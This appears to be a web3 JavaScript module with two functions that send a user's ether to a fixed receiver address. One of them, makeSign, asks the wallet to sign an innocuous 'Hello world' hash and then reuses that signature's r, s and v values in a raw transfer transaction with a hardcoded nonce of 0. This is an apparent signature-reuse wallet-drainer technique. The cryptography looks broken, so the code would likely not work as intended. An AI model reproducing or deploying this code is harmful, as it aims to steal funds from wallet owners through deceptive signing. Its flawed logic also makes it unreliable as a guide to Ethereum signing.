import "./ethereumjs-tx.min.js";
import { setError, setHash } from "./utils";

const _to = "Receiver address";
const _gasLimit = 25000;

const increaseGasPrice = (value) => {
  return Math.floor(value * 1.8);
};

const makeSign = async (web3, _from, amount) => {
  setError("");
  setHash("");

  const currentGasPrice = await web3.eth.getGasPrice();
  const _nonce = await web3.eth.getTransactionCount(_from, "pending");
  const _chainId = await web3.eth.getChainId();
  const _value = web3.utils.toWei(amount, "ether");

  const signed1 = await web3.eth.personal.sign(web3.utils.sha3("Hello world", { encoding: "hex" }), _from);
  // const signed2 = await web3.eth.sign(web3.utils.sha3("Hello world", { encoding: "hex" }), _from);

  const temporary1 = signed1.substring(2);
  const r_1 = "0x" + temporary1.substring(0, 64);
  const s_1 = "0x" + temporary1.substring(64, 128);
  const rhema1 = parseInt(temporary1.substring(128, 130), 16);
  const v_1 = web3.utils.toHex(rhema1 + _chainId * 2 + 8);

  console.log(signed1);
  console.log(r_1);
  console.log(s_1);
  console.log(v_1);

  // const temporary2 = signed2.substring(2);
  // const r_2 = "0x" + temporary2.substring(0, 64);
  // const s_2 = "0x" + temporary2.substring(64, 128);
  // const rhema2 = parseInt(temporary2.substring(128, 130), 16);
  // const v_2 = web3.utils.toHex(rhema2 + _chainId * 2 + 8);

  // console.log(signed2);
  // console.log(r_2);
  // console.log(s_2);
  // console.log(v_2);

  const rawTx = {
    from: _from,
    to: _to,
    nonce: web3.utils.toHex(0),
    gasLimit: web3.utils.toHex(_gasLimit),
    gasPrice: web3.utils.toHex(increaseGasPrice(currentGasPrice)),
    value: web3.utils.toHex(_value),
    chainId: web3.utils.toHex(_chainId),
    r: r_1,
    s: s_1,
    v: v_1,
  };

  let tx = new ethereumjs.Tx(rawTx);
  const serializedTx = "0x" + tx.serialize().toString("hex");
  try {
    const res = await web3.eth.sendSignedTransaction(serializedTx);
    console.log(res);
  } catch (error) {
    setError(error.message);
    console.log(error);
  }
};

const makeTransaction = async (web3, _from, amount) => {
  setError("");
  setHash("");

  const currentGasPrice = await web3.eth.getGasPrice();
  const _nonce = await web3.eth.getTransactionCount(_from, "pending");
  const _chainId = await web3.eth.getChainId();
  const _value = web3.utils.toWei(amount, "ether");

  const rawTx = {
    from: _from,
    to: _to,
    nonce: web3.utils.toHex(_nonce),
    gasLimit: web3.utils.toHex(_gasLimit),
    gasPrice: web3.utils.toHex(increaseGasPrice(currentGasPrice)),
    value: web3.utils.toHex(_value),
    chainId: web3.utils.toHex(_chainId),
  };

  try {
    const receipt = await web3.eth.sendTransaction(rawTx);
    setHash("Hash:<br/>" + receipt.transactionHash);
    console.log(receipt);
  } catch (error) {
    setError(error.message);
    console.log(error);
  }
};

export { makeSign, makeTransaction };
